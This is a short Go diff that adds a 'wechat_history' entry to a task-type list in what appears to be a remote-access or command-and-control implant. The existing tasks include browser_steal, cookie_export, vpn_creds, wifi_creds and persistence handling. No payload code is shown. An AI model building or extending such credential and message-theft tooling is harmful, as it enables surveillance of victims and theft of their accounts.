@@ -133,6 +133,7 @@ const (
 	TaskTypePersistenceList  = "persistence_list"
 	TaskTypePersistenceRem   = "persistence_remove"
 	TaskTypeBrowserSteal     = "browser_steal"
+	TaskTypeWeChatHistory    = "wechat_history"
 	TaskTypeCookieExport     = "cookie_export"
 	TaskTypeVPNCreds         = "vpn_creds"
 	TaskTypeWifiCreds        = "wifi_creds"
@@ -365,6 +366,7 @@ func AllTaskTypes() []string {
 		TaskTypePersistenceList,
 		TaskTypePersistenceRem,
 		TaskTypeBrowserSteal,
+		TaskTypeWeChatHistory,
 		TaskTypeCookieExport,
 		TaskTypeVPNCreds,
 		TaskTypeWifiCreds,
